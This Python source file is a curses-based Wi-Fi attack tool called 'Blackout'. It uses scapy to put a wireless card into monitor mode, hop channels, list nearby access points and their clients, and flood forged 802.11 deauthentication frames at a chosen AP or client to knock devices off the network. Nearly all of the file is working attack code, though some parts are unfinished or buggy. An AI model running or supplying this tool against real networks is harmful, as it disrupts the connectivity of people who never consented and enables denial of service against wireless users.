#!/usr/bin/python3

#  TODO: Use closure the fix the signal_handler issue
#  TODO: Use threads instead of Processes (threads were harder to stop with Ctrl-C?)
#  TODO: Improve -- Ending the AP sniffing phase. It's too rough. Ctrl-C is the current method.
#  TODO: Explore the use or curses library for the UI.
#  TODO: Can all the processes be daemonised?
#  TODO: Source most up-to-date vendor database. Find a way to keep it updated.
#  TODO: Use argparse for command-line options
#       TODO: Allow option for number of deauth packets to send (EX: -c 100)
#       TODO: Allow option for providing interface name

import os
import re
import sys
import signal
import curses
import pickle
import logging
import argparse
import traceback
from time import sleep
from utils import Utils
from subprocess import Popen, PIPE
from threading import Thread
from multiprocessing import Process, Manager
from scapy.all import *

# set scapy verbosity to zero
conf.verb = 0

# silence unwanted scapy output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"


class Blackout:

    def __init__(self, interface, stdscr, window):

        self.utils = Utils(interface)

        # Set curses screen object
        self.stdscr = stdscr
        self.window = window

        # Set scapy sniff interface
        conf.iface = interface
        self.iface = interface

        # Compile list of vendors
        self.vendors = Utils.compile_vendors()

        # Create cross-process data structures
        self.manager = Manager()
        self.outputs = self.manager.dict()
        self.ap_dict = self.manager.dict()
        self.all_bssid = self.manager.list()
        self.ap_clients = self.manager.list()

        # Declare some necessary variables
        self.outputs = {'screen': stdscr, 'window': window}
        self.target_ap = None
        self.target_bssid = None
        self.target_client = None

        # Flags for stopping Processes
        self.terminate_sniff_ap = False
        self.terminate_sniff_clients = False
        self.terminate_deauth = False

        # Channel hopping thread
        self.thread_channel_hop = Thread(
            target=Blackout.channel_hop,
            args=(str(interface),))

        # Make the thread run in the background as a daemon
        self.thread_channel_hop.daemon = True

        # AP sniffer Process
        self.proc_sniff_ap = Process(
            target=sniff, kwargs={
                'prn': self.sniff_access_points,
                'iface': conf.iface,
                'store': 0})

        # Client sniffer Process
        self.proc_sniff_clients = Process(
            target=sniff,
            kwargs={
                'prn': self.sniff_clients,
                'iface': conf.iface,
                'store': 0})

        # All Processes and their termination flags
        # ( [Process, flag], ... )
        self.procs_flags = (
            [self.proc_sniff_ap, self.terminate_sniff_ap],
            [self.proc_sniff_clients, self.terminate_sniff_clients])


    def to_window(self, text='\n', attr=curses.A_NORMAL, y=None, x=None):

        if y and x:
            self.outputs['window'].addstr(y+2, x, text, attr)

        else:
            y, x = self.outputs['screen'].getyx()
            self.outputs['screen'].move(y+2, x+1)
            self.outputs['window'].addstr(text, attr)

        self.window.noutrefresh()
        curses.doupdate()


    def run(self):

        # clear screen
        self.stdscr.clear()

        try:
            self.to_window(f"[+] Putting {self.iface} into MONITOR mode...\n", curses.color_pair(227))
            status = self.utils.start_mon()

            if status is False:
                raise Exception(f"[!!] Could not put {self.iface} into MONITOR mode")

            # Start daemon thread
            self.thread_channel_hop.start()
            
            self.to_window("[+] Sniffing for Access Points on all channels\n", curses.color_pair(227))
            self.to_window("[+] Press SPACE to select a target. Q to quit.\n", curses.color_pair(227))
            headers = self.utils.print_headers()
            self.to_window(headers, curses.A_BOLD)

            sleep(5)

            # Sniff for Wireless Access Points
            self.proc_sniff_ap.start()

            # Get user input with curses
            while True:
                c = self.stdscr.getch()
                if c == ord('q'):
                    for entry in self.procs_flags:
                        # Set all process termination flags
                        entry[1] = True
                    
                    self.exit_application()

                if c == ord(' '):
                    # Terminate AP sniffer Process
                    # Move to target selection phase
                    self.to_window("[+] You pressed SPACE....")
                    break

            # Wait for processes to terminate
            #self.thread_sniff_ap.join()

            # Output a very simple summary of findings
            self.utils.horizontal_rule(30, self.window)
            self.to_window(f"\nAccess Points discovered: {len(self.ap_dict)}\n\n", curses.A_BOLD)

            # Select an target AP
            self.target_ap = self.select_target_ap()
            
            # Important to make it upper for comparisons in self.sniff_clients
            self.target_bssid = self.target_ap['bssid'].upper()

            choice = self.utils.choose_mode()

            # Deuth ALL clients from AP
            if choice == '1':
                self.deauth(
                    self.target_ap['bssid'],
                    str(self.target_ap['channel']),
                    BROADCAST_ADDR)
                self.utils.horizontal_rule(30)
                self.window_write(f"\nSniffing for clients of AP - {self.target_ap['bssid']}...\n\n")
               # print(f"{Colour.OKBLUE}Press Ctrl-c to select target{Colour.ENDC}\n")

                self.proc_sniff_clients.start()
                self.proc_sniff_clients.join()

                self.list_clients()
                self.select_target_client()

                self.deauth(
                    self.target_ap['bssid'],
                    str(self.target_ap['channel']),
                    self.target_client)

        except Exception as e:
            self.to_window("blackout.run: {}\n".format(e), curses.A_NORMAL)
            Utils.log_error_to_file(traceback.format_exc())

        except KeyboardInterrupt:
            pass

        finally:
            # Put network card back into managed mode
            self.utils.stop_mon()


    def deauth(self, bssid, channel, target):
        """
        create deauth packets and send them to the target AP
        TODO:
        Allow multiple targets, including clients aswell as AP's
        """

        if target is BROADCAST_ADDR:
            print(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...")
        else:
            print(f"[*] Deauthing {target} from {bssid} on channel {channel}...")

        try:
            go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
            go_to_chan.communicate()

            dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid)
            # create deauth packet for AP and add to list
            deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)

            # send it
            # I don't think you're really supposed to use a for loop for this,
            # instead use the count argument to set number of packets. However,
            # I found this to be more reliable.
            try:
                #while True:
                sendp(deauth_pkt, inter=0.1, count=100, iface=conf.iface)

            # except KeyboardInterrupt:
            #     print("[*] Keyboard Interrupt\n")
            except Exception as e:
                print(f"[!] Error: {e}")
                self.utils.stop_mon()
                sys.exit(0)

            print("[*] Deauthentication Complete")
            return

        except Exception as e:
            print(f"[!] Error while Deauthenticating: {e}")


    def select_target_client(self):
        self.utils.horizontal_rule(30)

        target_id = int(input("\nEnter ID of the client you wish to target: "))

        #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
        # [{'1': [client info, ]}, {'2', [client info, ... ]}, ... ]
        self.target_client = self.ap_clients[target_id - 1]

        self.utils.horizontal_rule(30)
        print(f"\nTargeting Client: [{self.target_client}]\n")
        self.utils.horizontal_rule(30)


    def sniff_clients(self, pkt):

        # Go to correct channel
        channel = str(self.target_ap['channel'])
        go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
        go_to_chan.communicate()

        # IF right type of frame, and not involved in authentication
        try:
            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2): # and not pkt.haslayer(EAPOL):
                # Packet is a Data or Control Frame
                if pkt.addr1 and pkt.addr2:

                    # Get destination and source MAC addresses
                    dst = pkt.addr1.upper()
                    src = pkt.addr2.upper()

                    # If the target AP is either source or destination, we know the other is a client
                    if BROADCAST_ADDR not in (dst, src):
                        if src == self.target_bssid and dst not in self.ap_clients:
                            self.ap_clients.append(dst)
                            print(f"[*] {dst}\t{self.get_vendor(dst)}")

                        elif dst == self.target_bssid and src not in self.ap_clients:
                            self.ap_clients.append(src)
                            print(f"[*] {src}\t{self.get_vendor(src)}")

        except Exception as e:
            print(f"[*] sniff_clients error: {e}")


    def list_clients(self):
        print("\n")
        self.utils.horizontal_rule(20)
        for i, client in enumerate(self.ap_clients):
            # Find manufacturer
            name = self.get_vendor(client)
            print(f"{i + 1}) {client}\t{name}")


    def select_target_ap(self):
        self.utils.horizontal_rule(30)

        target_id = int(input("\nEnter ID of the AP you wish to target: "))

        #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
        target_ap = self.ap_dict[target_id]

        self.utils.horizontal_rule(30)
        print(f"\nSelected Access Point [{target_id}]\n")
        print(f"\tssid:\t\t{target_ap['ssid']:20}")
        print(f"\tbssid:\t\t{target_ap['bssid']:20}")
        print(f"\tchannel:\t\t{target_ap['channel']:20}\n")
        self.utils.horizontal_rule(30)

        return target_ap


    def sniff_access_points(self, pkt):
        """
        Sniff packets, and extract info from them
        """
        # Here scapy is going to check whether each sniffed packet
        # has particular 'layers' of encapsulation
        # and act accordingly

        if pkt.haslayer(Dot11):
            # Check for beacon frames or probe responses from AP's
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                
                # If the packet contains a BSSID we have not encountered
                if pkt.addr3.upper() not in self.all_bssid:  # addr3 -> BSSID
                    bssid = pkt.addr3.upper()  # add the bssid to our bssid list
                    self.all_bssid.append(bssid)

                    try:
                        count = len(self.ap_dict) + 1  # No. of AP's collected
                        ssid = pkt[3].info.decode()  # Extract SSID
                        if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
                            ssid = "*HIDDEN/NONE*"  # SSID is hidden

                        # credit to airoscapy.py(by iphelix) for this
                        # It's decoding the channel info from an awkward hex formatting('/x03' etc.)

                        channel = ord(pkt[Dot11Elt:3].info)

                        # Add Access-Point to the 'cross-process' dict
                        self.ap_dict[count] = {'bssid': bssid, 'ssid': ssid, 'channel': channel}
                        vendor = self.get_vendor(bssid)

                        # Output the catch
                        self.to_window(f"\n{count})\t{ssid}\t{bssid}\t{channel}\t\t{vendor}\n", curses.A_BOLD)

                    except Exception as e:
                        if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                            pass
                        else:
                            self.to_window(f"[!] Sniffer Error: {e}\n")
                            Utils.log_error_to_file(traceback.format_exc())
                            

    # TODO move to utils
    def get_vendor(self, bssid):
        name = ""
        try:
            name = self.vendors[bssid[:8]]
        except KeyError:
            name = "unknown device"

        return name

    # TODO move to utils
    @staticmethod
    def channel_hop(iface):
        """
        Hop channels until interrupted
        """

        # total of 13 channels to search through
        limit = 14

        while True:
            for i in range(1, 14): 
                channel = i % limit
                #print(channel)

                # using Popen instead of os.system here avoids superfluous
                # output to the terminal from the iw command
                # which at times can crash the program (I'm not sure why yet)
                # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work

                #print("{} - {}".format(conf.iface, type(conf.iface)))
                p = Popen(["iw", "dev", iface, "set", "channel", str(channel)])
                try:
                    # effectively execute p
                    p.communicate()
                    sleep(1)  # TODO -- Experiment with different values
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    pass


    def exit_curses(self):
        # End curses
        curses.nocbreak()
        self.stdscr.keypad(False)
        curses.echo()
        curses.endwin()

    
    def exit_application(self):

        self.to_window("[!!] Exiting...\n")

        for proc, _ in self.procs_flags:
            try:
                proc.terminate()
                proc.join()
            except Exception as e:
                self.to_window(f"exit-application: {e}")

        self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")
        self.utils.stop_mon()
        
        self.to_window("[!!] Exiting curses...")
        self.exit_curses()
        sys.exit(0)


    def signal_handler(self, sig, stack_frame):
        """
        This handles an interrupt signal, like
        Ctrl-C. Once detected, the program will sleep
        So we can 'get our affairs in order'
        """
        sleep(1)

        self.to_window("[+] INTERUPT\n", curses.A_BLINK)

        try:

            for proc, flag in self.procs_flags:
                if proc.is_alive() and flag:
                    try:
                        proc.terminate()
                        proc.join()
                    except Exception:
                        pass
                
        except Exception as e:
            Utils.log_error_to_file(e)

        finally:

            self.to_window("FINALLY\n")

            # If all flags are True, exit the application
            if all(flag for _, flag in self.procs_flags):

                self.to_window("ALL FLAGS TRUE")
                #TODO return string from function and print that instead
                self.utils.stop_mon()

                self.to_window("[!] You pressed 'q'...\n")

                sleep(5)

                # End curses
                curses.nocbreak()
                stdscr.keypad(False)
                curses.echo()
                curses.endwin()

                # Exit
                sys.exit(0)


if __name__ == "__main__":

    # Setup curses
    stdscr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    #curses.curs_set(0)
    stdscr.keypad(True)

    # Use all the colours!
    # https://stackoverflow.com/questions/18551558/how-to-use-terminal-color-palette-with-curses
    curses.start_color()
    curses.use_default_colors()
    for i in range(0, curses.COLORS):
        curses.init_pair(i + 1, i, -1)


    HEIGHT, WIDTH = stdscr.getmaxyx()

    window = curses.newwin(HEIGHT-2, WIDTH-2, 1, 1)
    #window.border('|', '|', '-', '-', '+', '+', '+', '+')
    
    stdscr.noutrefresh()
    window.noutrefresh()
    curses.doupdate()

    blackout = Blackout("wlan0", stdscr, window)

    # Set the signal handler
    signal.signal(signal.SIGINT, blackout.signal_handler)

    try:
        blackout.run()

    except Exception as e:
        window.addstr(f"[!] Error running blackout.run(): {e}")
        Utils.log_error_to_file(traceback.format_exc())

    except KeyboardInterrupt:
        pass

    # finally:
    #     # End curses
    #     curses.nocbreak()
    #     stdscr.keypad(False)
    #     curses.echo()
    #     curses.endwin()

    #     sys.exit(0)


